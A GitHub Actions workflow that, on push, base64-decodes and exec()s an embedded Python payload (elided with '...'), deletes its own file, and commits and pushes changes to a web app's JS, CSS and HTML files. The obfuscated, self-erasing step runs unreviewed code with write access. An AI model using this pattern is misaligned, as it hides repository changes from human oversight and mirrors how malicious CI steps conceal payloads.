name: Add Bill progressive disclosure

'on':
  push:
    paths:
      - .github/workflows/add-bill-disclosures.yml

permissions:
  contents: write

jobs:
  update:
    runs-on: ubuntu-latest
    steps:
      - name: Check out repository
        uses: actions/checkout@v4

      - name: Apply Add Bill disclosure design
        shell: bash
        run: |
          python3 -c "import base64;exec(base64.b64decode(' cpKX0iPjwvbGFiZWw+Cjx  ...') )"
          rm .github/workflows/add-bill-disclosures.yml

      - name: Commit changes
        shell: bash
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add assets/js/core/view-renderers.js assets/css/breathing-room.css index.html .github/workflows/add-bill-disclosures.yml
          git diff --cached --quiet || git commit -m "Add progressive disclosure to Add Bill details"
          git push